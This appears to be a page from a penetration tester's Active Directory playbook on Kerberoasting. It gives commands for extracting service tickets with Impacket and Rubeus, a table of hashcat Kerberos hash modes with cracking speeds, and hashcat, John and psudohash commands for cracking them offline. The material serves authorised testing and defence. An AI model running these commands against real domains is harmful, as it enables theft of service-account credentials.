## Kerberoasting Attack [t-ad-kerberos-kerberoasting]

Any domain user can ask for a Service Ticket with a registered SPN. The KDC provides a 
Service Ticket with a part encrypted with the key derived from a service`s password.

An attacker can attempt to crack the encrypted part of a Kerberos ticket offline by guessing 
the password associated with the service principal name (SPN). It`s not that dangerous in case 
of computer accounts since their passwords are usually totally random and very long. However, 
in some cases, SPNs may be configured for user or service accounts where passwords were set manually. 
In these cases, the passwords may be weaker and more susceptible to offline cracking attacks.



{% hint style="info" %}By default tools request RC4 encrypted tickets that can be (and probably will be) detected by SOC
{% endhint %}
###  Extract tickets




**option 1: impacket**

{% code overflow="wrap" %}
```bash
impacket-GetUserSPNs -request -dc-ip <dc-ip> 'domain.com/user:P@ssw0rd' > kerberoast.txt
```
{% endcode %}


**option 2: rubeus**

{% code overflow="wrap" %}
```bash
Rubeus.exe kerberoast /outfile:kerberoast.txt
#or Rubeus.exe kerberoast /simple /nowrap
#or Rubeus.exe kerberoast /user:mssql_svc /nowrap

```
{% endcode %}

## Crack user hashes locally [t-ad-credential_access-user_hashes_cracking]

Crack user hashes locally


{% hint style="info" %}Hashcat hash types (https://hashcat.net/wiki/doku.php?id=example_hashes):

#AR-REQ Roasting
7500 - Kerberos 5, etype 23 (RC4), Pre-Auth (3599.6 MH/s RTX4090)
19800 - Kerberos, etype 17 (AES128), Pre-Auth (5135.3 kH/s RTX4090)
19900 - Kerberos, etype 18 (AES256), Pre-Auth (2571.6 kH/s RTX4090)

#Kerberoasting 
13100 - Kerberos 5, etype 23, TGS-REP #3478.0 MH/s on RTX4090
19600 - Kerberos 5, etype 17, TGS-REP (AES128-CTS-HMAC-SHA1-96) #5100.2 kH/s on RTX4090
19700 - Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96) #2562.9 kH/s on RTX4090

#AS-REP roasting
18200	Kerberos 5, etype 23 (RC4), AS-REP, 3564.1 MH/s on RTX4090

#Wordlists

#Rules
{% endhint %}
### 2.1.1 Crack the hashes using basic dictionaries




**option 1: hashcat**

{% code overflow="wrap" %}
```bash
hashcat -O -m <hashtype> hash.txt /usr/share/wordlists/rockyou.txt --force
```
{% endcode %}


**option 2: john**

{% code overflow="wrap" %}
```bash
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```
{% endcode %}

### 2.1.2 Try to use rules



{% code overflow="wrap" %}
```bash
hashcat -O -m <hashtype> -r rules/dive.rule hash.txt /usr/share/wordlists/rockyou.txt --force
```
{% endcode %}

### 2.1.3 Try to use pattern-based password list generators



{% code overflow="wrap" %}
```bash
psudohash.py -w 'company' --common-paddings-after --common-paddings-before -y 2020,2023
```
{% endcode %}

### 2.1.4 Try to use different wordlists



# Possible Findings:
* [Kerberos Pre Authentication Not Enabled](../../../findings/f-ad-account_review-disabled_pre_authentication.md)
